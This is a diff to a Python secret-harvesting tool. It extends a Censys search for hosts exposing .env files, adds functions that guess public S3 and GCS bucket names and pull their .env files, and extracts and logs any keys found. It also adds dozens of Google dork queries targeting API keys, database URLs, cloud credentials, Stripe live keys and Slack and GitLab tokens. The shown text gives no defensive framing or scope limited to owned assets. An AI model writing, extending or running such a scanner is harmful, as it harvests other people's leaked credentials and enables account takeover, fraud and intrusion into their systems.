@@ -160,17 +160,19 @@ def scan_censys():
     print("\n[Censys]")
     if not CENSYS_SECRET: return print("  No API key")
     try:
-        # censys_{api_id}_{secret} format OR full token
-        import base64
-        parts = CENSYS_SECRET.split("_")
-        if len(parts) >= 3 and parts[0] == "censys":
-            uid, secret = parts[1], parts[2]
-        else:
-            uid, secret = parts[0], CENSYS_SECRET
-        auth_b64 = base64.b64encode(f"{uid}:{secret}".encode()).decode()
-        r = requests.get("https://search.censys.io/api/v2/hosts/search?q=.env+AND+services.service_name=HTTP",
-            headers={"Accept": "application/json", "Authorization": f"Basic {auth_b64}"}, timeout=15)
-        if r.status_code != 200: return print(f"  API error: {r.status_code} (tried uid={uid[:8]}... secret={secret[:8]}...)")
+        # Try Bearer token with full censys_xxx token
+        r = requests.get("https://search.censys.io/api/v2/hosts/search?q=.env+AND+services.service_name%3DHTTP&per_page=30",
+            headers={"Accept": "application/json", "Authorization": f"Bearer {CENSYS_SECRET}"}, timeout=15)
+        if r.status_code == 401:
+            # Try Basic auth with parsed API ID and Secret
+            import base64
+            parts = CENSYS_SECRET.split("_")
+            if len(parts) >= 3:
+                api_id, secret = parts[1], parts[2]
+                auth_b64 = base64.b64encode(f"{api_id}:{secret}".encode()).decode()
+                r = requests.get("https://search.censys.io/api/v2/hosts/search?q=.env&per_page=30",
+                    headers={"Accept": "application/json", "Authorization": f"Basic {auth_b64}"}, timeout=15)
+        if r.status_code != 200: return print(f"  API error: {r.status_code}")
         for hit in r.json().get("result", {}).get("hits", [])[:30]:
             ip = hit.get("ip", "?"); services = hit.get("services", [])
             for svc in services:
@@ -258,6 +260,31 @@ def scan_pypi():
     except Exception as e:
         print(f"  Error: {e}")
 
+def scan_s3():
+    print("\n[S3 Buckets]")
+    common = ["admin", "backup", "data", "uploads", "static", "media", "assets", "files", "private", "config"]
+    for name in common:
+        for ext in ["", "-data", "-backup", "-uploads"]:
+            url = f"https://{name}{ext}.s3.amazonaws.com/.env"
+            try:
+                r = requests.get(url, timeout=7)
+                if r.status_code == 200 and "KEY" in r.text:
+                    for k in extract_keys(r.text):
+                        log_result(k["service"], k["key"], "s3", url, "", f"s3://{name}{ext}", k["entropy"])
+            except: pass
+
+def scan_gcs():
+    print("\n[GCS Buckets]")
+    common = ["admin", "backup", "data", "uploads", "static"]
+    for name in common:
+        url = f"https://storage.googleapis.com/{name}/.env"
+        try:
+            r = requests.get(url, timeout=7)
+            if r.status_code == 200 and "KEY" in r.text:
+                for k in extract_keys(r.text):
+                    log_result(k["service"], k["key"], "gcs", url, "", f"gcs://{name}", k["entropy"])
+        except: pass
+
 # ── 11. Vercel (via Google dorking) ──
 
 VERCEL_DORKS = [
@@ -295,6 +322,7 @@ def scan_vercel():
 # ── 12. Google Dorking ──
 
 GOOGLE_DORKS = [
+    # API keys in env files
     '"OPENAI_API_KEY" filetype:env',
     '"sk-proj-" filetype:env',
     '"ANTHROPIC_API_KEY" filetype:env',
@@ -305,6 +333,58 @@ GOOGLE_DORKS = [
     'inurl:.env.example "sk-"',
     '"HF_TOKEN" filetype:env',
     '"DATABASE_URL" filetype:env "password"',
+    # Cloud storage
+    'site:s3.amazonaws.com .env',
+    'site:storage.googleapis.com .env',
+    'site:blob.core.windows.net .env',
+    'intitle:"index of" .env',
+    # Config files
+    'filetype:json "api_key"',
+    'filetype:yaml "apiKey"',
+    'filetype:toml "api-key"',
+    'inurl:config.json "secret"',
+    'inurl:.env.production',
+    # Database connection strings
+    '"mongodb://" filetype:env',
+    '"mysql://" filetype:env',
+    '"postgresql://" filetype:env',
+    # Cloud provider keys
+    '"aws_secret_access_key"',
+    '"google_application_credentials"',
+    '"private_key_id" filetype:json',
+    # Payment/subscription
+    '"sk_live_" filetype:env',
+    '"stripe" filetype:env',
+    '"braintree" "merchant_id"',
+    # Social media APIs
+    '"facebook_api" filetype:env',
+    '"twitter_api" filetype:env',
+    '"instagram_access_token"',
+    # Misc
+    '"xoxb-" filetype:env',
+    '"glpat-" filetype:env',
+    'inurl:wp-config.php "API"',
+    'filetype:log "api_key"',
+    'inurl:phpinfo.php "OPENAI"',
+    # Backup files
+    '"backup" "OPENAI_API_KEY"',
+    'filetype:sql "api_key"',
+    'filetype:csv "api_key"',
+    # Cloud platforms
+    'site:vercel.app ".env"',
+    'site:netlify.app ".env"',
+    'site:herokuapp.com ".env"',
+    'site:render.com ".env"',
+    # Kubernetes/Docker
+    '"KUBERNETES_SERVICE_HOST" filetype:env',
+    'filetype:dockerfile "ENV"',
+    # New patterns
+    '"sk-or-v1-" filetype:env',
+    '"gsk_" filetype:env',
+    '"pplx-" filetype:env',
+    'inurl:.env.local',
+    'filetype:ini "api_key"',
+    'inurl:configuration.php "OPENAI"',
 ]
 
 def scan_googledork():
